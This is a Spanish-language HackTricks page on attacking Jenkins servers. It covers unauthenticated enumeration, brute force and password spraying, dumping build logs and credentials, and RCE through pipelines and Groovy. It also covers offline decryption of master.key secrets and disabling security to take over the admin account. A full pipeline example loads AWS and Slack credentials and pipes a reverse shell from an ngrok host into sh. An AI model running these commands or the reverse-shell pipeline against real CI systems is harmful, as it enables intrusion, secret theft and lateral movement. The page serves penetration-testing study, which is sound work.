# Seguridad en Jenkins

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informaci√≥n B√°sica

Jenkins ofrece una manera sencilla de configurar un entorno de **integraci√≥n continua** o **entrega continua** (CI/CD) para casi **cualquier** combinaci√≥n de **lenguajes** y repositorios de c√≥digo fuente utilizando pipelines, as√≠ como automatizar otras tareas rutinarias de desarrollo. Aunque Jenkins no elimina la **necesidad de crear scripts para pasos individuales**, s√≠ proporciona una forma m√°s r√°pida y robusta de integrar toda tu cadena de herramientas de construcci√≥n, prueba y despliegue de lo que podr√≠as construir f√°cilmente por ti mismo.\
Definici√≥n de [aqu√≠](https://www.infoworld.com/article/3239666/what-is-jenkins-the-ci-server-explained.html).

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## Enumeraci√≥n Sin Autenticaci√≥n

Para buscar p√°ginas interesantes de Jenkins sin autenticaci√≥n como (_/people_ o _/asynchPeople_, que lista los usuarios actuales) puedes usar:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
Comprueba si puedes ejecutar comandos sin necesidad de autenticaci√≥n:
```
msf> use auxiliary/scanner/http/jenkins_command
```
Sin credenciales puedes mirar dentro del camino _**/asynchPeople/**_ o _**/securityRealm/user/admin/search/index?q=**_ para **nombres de usuario**.

Puedes ser capaz de obtener la versi√≥n de Jenkins desde el camino _**/oops**_ o _**/error**_

![](<../../.gitbook/assets/image (48).png>)

### Vulnerabilidades Conocidas

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## Inicio de Sesi√≥n

En la informaci√≥n b√°sica puedes verificar **todas las formas de iniciar sesi√≥n en Jenkins**:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Registro

Ser√°s capaz de encontrar instancias de Jenkins que **permiten crear una cuenta e iniciar sesi√≥n en ella. Tan simple como eso.**

### **Inicio de Sesi√≥n SSO**

Tambi√©n si la **funcionalidad**/**plugins** de **SSO** estuvieran presentes, entonces deber√≠as intentar **iniciar sesi√≥n** en la aplicaci√≥n usando una cuenta de prueba (por ejemplo, una cuenta de prueba de **Github/Bitbucket**). Truco de [**aqu√≠**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/).

### Fuerza Bruta

**Jenkins** no implementa ninguna **pol√≠tica de contrase√±as** o mitigaci√≥n de **fuerza bruta** en nombres de usuario. Entonces, **deber√≠as** siempre intentar **fuerza bruta** en usuarios porque probablemente se est√©n utilizando **contrase√±as d√©biles** (incluso **nombres de usuario como contrase√±as** o **nombres de usuario al rev√©s** como contrase√±as).
```
msf> use auxiliary/scanner/http/jenkins_login
```
### Ataque de pulverizaci√≥n de contrase√±as

Utiliza [este script de python](https://github.com/gquere/pwn_jenkins/blob/master/password_spraying/jenkins_password_spraying.py) o [este script de powershell](https://github.com/chryzsh/JenkinsPasswordSpray).

### Evasi√≥n de Listas Blancas de IP

Muchas organizaciones combinan **sistemas de gesti√≥n de control de fuente basados en SaaS** (como GitHub o GitLab) con una soluci√≥n **CI** interna y autoalojada (por ejemplo, Jenkins, TeamCity) permitiendo que estos sistemas CI **reciban eventos de webhook de los proveedores de control de fuente SaaS**, con el simple prop√≥sito de desencadenar trabajos de pipeline.

Por lo tanto, las organizaciones **incluyen en listas blancas** los rangos de **IP** de los **SCM** permiti√©ndoles alcanzar el sistema CI **interno** con **webhooks**. Sin embargo, ten en cuenta c√≥mo **cualquiera** puede crear una **cuenta** en Github o Gitlab y hacer que **active un webhook** que podr√≠a enviar una solicitud a ese sistema CI **interno**.

{% content-ref url="scm-ip-whitelisting-bypass.md" %}
[scm-ip-whitelisting-bypass.md](scm-ip-whitelisting-bypass.md)
{% endcontent-ref %}

## Abusos Internos de Jenkins

En estos escenarios vamos a suponer que tienes una cuenta v√°lida para acceder a Jenkins.

{% hint style="warning" %}
Dependiendo del mecanismo de **Autorizaci√≥n** configurado en Jenkins y del permiso del usuario comprometido, **podr√≠as o no ser capaz de realizar los siguientes ataques.**
{% endhint %}

Para m√°s informaci√≥n revisa la informaci√≥n b√°sica:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Listado de usuarios

Si has accedido a Jenkins, puedes listar otros usuarios registrados en [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)

### Extracci√≥n de construcciones para encontrar secretos en texto claro

Utiliza [este script](https://github.com/gquere/pwn_jenkins/blob/master/dump_builds/jenkins_dump_builds.py) para volcar salidas de consola de construcci√≥n y variables de entorno de construcci√≥n con la esperanza de encontrar secretos en texto claro.
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **Robando Credenciales SSH**

Si el usuario comprometido tiene **suficientes privilegios para crear/modificar un nuevo nodo de Jenkins** y ya se han almacenado credenciales SSH para acceder a otros nodos, podr√≠a **robar esas credenciales** creando/modificando un nodo y **estableciendo un host que registrar√° las credenciales** sin verificar la clave del host:

![](<../../.gitbook/assets/image (56).png>)

Normalmente encontrar√°s credenciales SSH de Jenkins en un **proveedor global** (`/credentials/`), por lo que tambi√©n puedes volcarlas como lo har√≠as con cualquier otro secreto. M√°s informaci√≥n en la secci√≥n [**Volcando secretos**](./#dumping-secrets).

### **RCE en Jenkins**

Obtener una **shell en el servidor de Jenkins** le da al atacante la oportunidad de filtrar todos los **secretos** y **variables de entorno** y de **explotar otras m√°quinas** ubicadas en la misma red o incluso **recolectar credenciales de la nube**.

Por defecto, Jenkins ejecutar√° los builds **‚Äúcomo sistema‚Äù**. En otras palabras, se le asigna al usuario **SYSTEM todo poderoso**, lo que significa que cualquier acci√≥n ejecutada durante el build tiene permiso para hacer lo que quiera.

### **RCE Creando/Modificando un proyecto**

Crear/Modificar un proyecto es una forma de obtener RCE sobre el servidor de Jenkins:

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **RCE Ejecutando un script Groovy**

Tambi√©n puedes obtener RCE ejecutando un script Groovy, lo cual podr√≠a ser m√°s sigiloso que crear un nuevo proyecto:

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### RCE Creando/Modificando Pipeline

Tambi√©n puedes obtener **RCE creando/modificando un pipeline**:

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## Explotaci√≥n de Pipelines

Para explotar pipelines todav√≠a necesitas tener acceso a Jenkins.

### Construir Pipelines

Los **Pipelines** tambi√©n pueden ser utilizados como **mecanismo de construcci√≥n en proyectos**, en ese caso se puede configurar un **archivo dentro del repositorio** que contendr√° la sintaxis del pipeline. Por defecto se utiliza `/Jenkinsfile`:

![](<../../.gitbook/assets/image (14) (1) (1).png>)

Tambi√©n es posible **almacenar archivos de configuraci√≥n de pipelines en otros lugares** (en otros repositorios, por ejemplo) con el objetivo de **separar** el acceso al repositorio y el acceso al pipeline.

Si un atacante tiene **acceso de escritura sobre ese archivo**, podr√° **modificarlo** y **potencialmente activar** el pipeline sin siquiera tener acceso a Jenkins.\
Es posible que el atacante necesite **sortear algunas protecciones de rama** (dependiendo de la plataforma y los privilegios del usuario, podr√≠an ser sorteadas o no).

Los desencadenantes m√°s comunes para ejecutar un pipeline personalizado son:

* **Pull request** a la rama principal (o potencialmente a otras ramas)
* **Push a la rama principal** (o potencialmente a otras ramas)
* **Actualizar la rama principal** y esperar hasta que se ejecute de alguna manera

{% hint style="info" %}
Si eres un **usuario externo** no deber√≠as esperar crear un **PR a la rama principal** del repositorio de **otro usuario/organizaci√≥n** y **activar el pipeline**... pero si est√° **mal configurado** podr√≠as comprometer completamente empresas solo explotando esto.
{% endhint %}

### RCE de Pipeline

En la secci√≥n anterior de RCE ya se indic√≥ una t√©cnica para [**obtener RCE modificando un pipeline**](./#rce-creating-modifying-pipeline).

### Verificando variables de entorno

Es posible declarar **variables de entorno en texto claro** para todo el pipeline o para etapas espec√≠ficas. Estas variables de entorno **no deber√≠an contener informaci√≥n sensible**, pero un atacante siempre podr√≠a **revisar todas las configuraciones** del pipeline/Jenkinsfiles:
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### Extracci√≥n de secretos

Para informaci√≥n sobre c√≥mo son tratados usualmente los secretos por Jenkins, consulta la informaci√≥n b√°sica:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Las credenciales pueden estar **asignadas a proveedores globales** (`/credentials/`) o a **proyectos espec√≠ficos** (`/job/<nombre-del-proyecto>/configure`). Por lo tanto, para exfiltrar todas ellas necesitas **comprometer al menos todos los proyectos** que contienen secretos y ejecutar pipelines personalizados/envenenados.

Hay otro problema, para obtener un **secreto dentro del entorno** de un pipeline necesitas **conocer el nombre y tipo del secreto**. Por ejemplo, si intentas **cargar** un **secreto `usernamePassword`** como un **secreto `string`** obtendr√°s este **error**:
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
Aqu√≠ tienes la manera de cargar algunos tipos comunes de secretos:
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
Al final de esta p√°gina puedes **encontrar todos los tipos de credenciales**: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
La mejor manera de **volcar todos los secretos de una vez** es **comprometiendo** la m√°quina de **Jenkins** (ejecutando un shell reverso en el **nodo integrado**, por ejemplo) y luego **filtrando** las **claves maestras** y los **secretos cifrados** y descifr√°ndolos fuera de l√≠nea.\
M√°s sobre c√≥mo hacer esto en la secci√≥n [Nodos y Agentes](./#nodes-and-agents) y en la secci√≥n [Post Explotaci√≥n](./#post-exploitation).
{% endhint %}

### Disparadores

De [la documentaci√≥n](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers): La directiva `triggers` define las **formas automatizadas en las que el Pipeline deber√≠a ser reactivado**. Para Pipelines que est√°n integrados con una fuente como GitHub o BitBucket, `triggers` puede no ser necesario ya que es probable que ya exista una integraci√≥n basada en webhooks. Los disparadores actualmente disponibles son `cron`, `pollSCM` y `upstream`.

Ejemplo de cron:
```bash
triggers { cron('H */4 * * 1-5') }
```
Revise **otros ejemplos en la documentaci√≥n**.

### Nodos y Agentes

Una **instancia de Jenkins** podr√≠a tener **diferentes agentes ejecut√°ndose en distintas m√°quinas**. Desde la perspectiva de un atacante, el acceso a diferentes m√°quinas significa **potenciales credenciales de nube diferentes** para robar o **diferente acceso a la red** que podr√≠a ser abusado para explotar otras m√°quinas.

Para m√°s informaci√≥n, consulta la informaci√≥n b√°sica:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Puedes enumerar los **nodos configurados** en `/computer/`, usualmente encontrar√°s el **`Nodo Integrado`** (que es el nodo donde se ejecuta Jenkins) y potencialmente m√°s:

![](<../../.gitbook/assets/image (25).png>)

Es **especialmente interesante comprometer el Nodo Integrado** porque contiene informaci√≥n sensible de Jenkins.

Para indicar que quieres **ejecutar** el **pipeline** en el **nodo integrado de Jenkins** puedes especificar dentro del pipeline la siguiente configuraci√≥n:
```bash
pipeline {
agent {label 'built-in'}
```
### Ejemplo completo

Pipeline en un agente espec√≠fico, con un disparador cron, con variables de entorno de pipeline y etapa, cargando 2 variables en un paso y enviando un shell inverso:
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## Post Explotaci√≥n

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Secretos de Jenkins

Puedes listar los secretos accediendo a `/credentials/` si tienes suficientes permisos. Ten en cuenta que esto solo listar√° los secretos dentro del archivo `credentials.xml`, pero los **archivos de configuraci√≥n de compilaci√≥n** tambi√©n pueden tener **m√°s credenciales**.

Si puedes **ver la configuraci√≥n de cada proyecto**, tambi√©n puedes ver all√≠ los **nombres de las credenciales (secretos)** que se usan para acceder al repositorio y **otras credenciales del proyecto**.

![](<../../.gitbook/assets/image (9) (1) (1) (1) (1).png>)

#### Desde Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### Desde el disco

Estos archivos son necesarios para **descifrar los secretos de Jenkins**:

* secrets/master.key
* secrets/hudson.util.Secret

Estos **secretos se pueden encontrar usualmente en**:

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

Aqu√≠ hay una expresi√≥n regular para encontrarlos:
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Descifrar secretos de Jenkins sin conexi√≥n

Si has volcado las **contrase√±as necesarias para descifrar los secretos**, usa [**este script**](https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py) **para descifrar esos secretos**.
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### Descifrar secretos de Jenkins desde Groovy
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### Crear nuevo usuario administrador

1. Accede al archivo de configuraci√≥n de Jenkins `config.xml` en `/var/lib/jenkins/config.xml` o `C:\Program Files (x86)\Jenkis\`
2. Busca la palabra `<useSecurity>true</useSecurity>` y cambia la palabra **`true`** por **`false`**.
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Reinicia** el servidor de **Jenkins**: `service jenkins restart`
4. Ahora vuelve al portal de Jenkins y **esta vez Jenkins no pedir√° credenciales**. Navega a "**Manage Jenkins**" para establecer **de nuevo la contrase√±a del administrador**.
5. **Habilita** la **seguridad** nuevamente cambiando la configuraci√≥n a `<useSecurity>true</useSecurity>` y **reinicia Jenkins de nuevo**.

## Referencias

* [https://github.com/gquere/pwn_jenkins](https://github.com/gquere/pwn_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
